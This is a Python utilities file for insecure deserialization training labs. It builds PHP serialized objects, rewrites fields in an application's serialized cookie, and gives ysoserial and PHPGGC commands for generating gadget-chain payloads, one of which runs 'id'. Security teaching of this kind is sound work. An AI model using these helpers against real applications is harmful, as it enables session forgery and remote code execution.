"""
utils.py — shared helpers for the Insecure Deserialization module labs.

📝 Note: unlike most other modules, the actual "payload" here is almost
never something we hand-write from scratch past the basic labs — it's a
serialized-object byte format specific to the backend language (PHP, Java,
Ruby), and for the gadget-chain labs (5-10) the standard approach is to use
the established community tools that generate these chains (ysoserial for
Java, PHPGGC for PHP) rather than reinventing them. `requests` handles the
actual HTTP delivery fine throughout — it's payload GENERATION that needs
external tooling for the harder labs.
"""

from proxies import BURP_PROXIES, VERIFY_SSL
import requests


def get_session():
    s = requests.Session()
    s.proxies.update(BURP_PROXIES)
    s.verify = VERIFY_SSL
    return s


def log(msg, ok=True):
    prefix = "[+]" if ok else "[-]"
    print(f"{prefix} {msg}")


def note(msg):
    """📝 Educational aside — prints a short explainer inline with exploit output."""
    print(f"📝 {msg}")


# ---- PHP serialization -----------------------------------------------
# 📝 PHP's native serialize() format: type-prefixed, length-counted. Simple
# enough to hand-roll for the early labs (modifying an existing serialized
# object's fields) without needing PHP itself installed.

def php_serialize(value):
    if isinstance(value, bool):
        return f"b:{1 if value else 0};"
    if isinstance(value, int):
        return f"i:{value};"
    if isinstance(value, float):
        return f"d:{value};"
    if isinstance(value, str):
        # PHP counts BYTES, not characters — matters for multi-byte strings.
        b = value.encode()
        return f's:{len(b)}:"{value}";'
    if isinstance(value, dict):
        parts = "".join(php_serialize(k) + php_serialize(v) for k, v in value.items())
        return f"a:{len(value)}:{{{parts}}}"
    if value is None:
        return "N;"
    raise TypeError(f"No PHP serializer for type {type(value)}")


def php_serialize_object(class_name, properties: dict):
    """
    Serialize a PHP object: O:<namelen>:"<name>":<propcount>:{<props>}
    `properties` keys should already be the exact property names as PHP
    would serialize them (private/protected properties get name-mangled
    with null bytes in real PHP — see note() below for when that matters).
    """
    props = "".join(php_serialize(k) + php_serialize(v) for k, v in properties.items())
    return f'O:{len(class_name)}:"{class_name}":{len(properties)}:{{{props}}}'


def modify_php_serialized_field(serialized, field_name, new_value):
    """
    Swap one field's value in an EXISTING serialized string while keeping
    everything else intact — the common Lab 1/2 workflow: fetch the app's
    own serialized cookie, tweak one field, re-serialize just that part,
    and fix up the surrounding length prefixes.
    """
    import re
    # Match s:<len>:"<field_name>";<TYPE-PREFIXED-VALUE>
    pattern = re.compile(
        r'(s:\d+:"' + re.escape(field_name) + r'";)(s:\d+:"[^"]*";|i:-?\d+;|b:[01];)'
    )
    new_value_serialized = php_serialize(new_value)
    return pattern.sub(lambda m: m.group(1) + new_value_serialized, serialized, count=1)


# ---- External tool notes ----------------------------------------------

YSOSERIAL_NOTE = """
ysoserial (Java gadget chains) — not reimplemented here; it's the
established community tool for a reason (each gadget chain is a serious
amount of reflection-based plumbing per vulnerable library version).

    git clone https://github.com/frohoff/ysoserial
    # or download the pre-built jar from its GitHub releases page
    java -jar ysoserial.jar CommonsCollections4 'id' > payload.bin

Then base64-encode payload.bin and send it as the cookie/param value —
see lab05_apache_commons.py for the delivery half.
"""

PHPGGC_NOTE = """
PHPGGC (PHP gadget chains) — same reasoning as ysoserial, PHP side.

    git clone https://github.com/ambionics/phpggc
    ./phpggc -l                     # list available chains
    ./phpggc <framework/chain> <method> <args> -b   # -b = base64-encode output

See lab06_php_prebuilt_gadget_chain.py for the delivery half.
"""
